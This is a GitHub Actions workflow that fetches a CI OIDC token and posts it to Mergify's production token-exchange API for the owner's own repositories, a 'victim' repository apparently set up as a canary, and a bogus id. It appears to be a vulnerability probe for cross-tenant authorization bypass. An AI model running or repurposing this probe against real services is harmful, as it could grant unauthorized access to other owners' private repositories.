name: oidc-e2e
on:
  push:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  exchange:
    runs-on: ubuntu-latest
    steps:
      - name: exchange probes
        run: |
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api.mergify.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "=== A: own repo id 535704198 (ertugrulphp/ertugrulphp)"
          curl -s -o /tmp/a -w 'status=%{http_code}\n' -X POST https://api.mergify.com/v1/ci/oidc/exchange -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"repository_id":535704198}'; head -c 400 /tmp/a; echo
          echo "=== B: own other repo id 557596580 (ertugrulphp/commerce)"
          curl -s -o /tmp/b -w 'status=%{http_code}\n' -X POST https://api.mergify.com/v1/ci/oidc/exchange -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"repository_id":557596580}'; head -c 400 /tmp/b; echo
          echo "=== C: FOREIGN repo id 1458145787 (diablo31/victim-private-canary)"
          curl -s -o /tmp/c -w 'status=%{http_code}\n' -X POST https://api.mergify.com/v1/ci/oidc/exchange -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"repository_id":1458145787}'; head -c 400 /tmp/c; echo
          echo "=== D: bogus repo id 999999999"
          curl -s -o /tmp/d -w 'status=%{http_code}\n' -X POST https://api.mergify.com/v1/ci/oidc/exchange -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"repository_id":999999999}'; head -c 300 /tmp/d; echo
